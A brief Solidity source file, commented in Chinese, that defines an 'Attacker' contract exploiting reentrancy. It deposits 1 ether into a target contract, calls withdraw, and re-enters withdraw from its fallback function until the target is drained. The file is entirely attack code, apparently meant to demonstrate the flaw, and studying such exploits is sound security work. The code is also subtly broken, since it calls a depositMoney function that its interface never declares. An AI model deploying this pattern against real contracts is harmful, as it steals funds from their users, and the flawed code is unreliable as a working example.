pragma solidity ^0.4.24;

interface Dangerous {
    function withdraw(uint amount) external;
}

contract Attacker {
    Dangerous public dangerousContract;
    uint public amountToWithdraw;

    constructor(address _dangerousContractAddress) public {
        dangerousContract = Dangerous(_dangerousContractAddress);
        // 设置要提取的金额，这里假设易受攻击合约中有足够的资金，且我们的存款足够
        amountToWithdraw = 1 ether; 
    }

    function attack() public payable {
        // 首先向易受攻击合约存款，确保有可提取的金额
        dangerousContract.depositMoney.value(amountToWithdraw)();
        // 调用易受攻击合约的withdraw函数，触发攻击
        dangerousContract.withdraw(amountToWithdraw);
    }

    //  fallback函数，在收到以太币时被调用
    function () public payable {
        // 当从易受攻击合约收到转账时，再次调用withdraw函数
        if (address(dangerousContract).balance >= amountToWithdraw) {
            dangerousContract.withdraw(amountToWithdraw);
        }
    }
}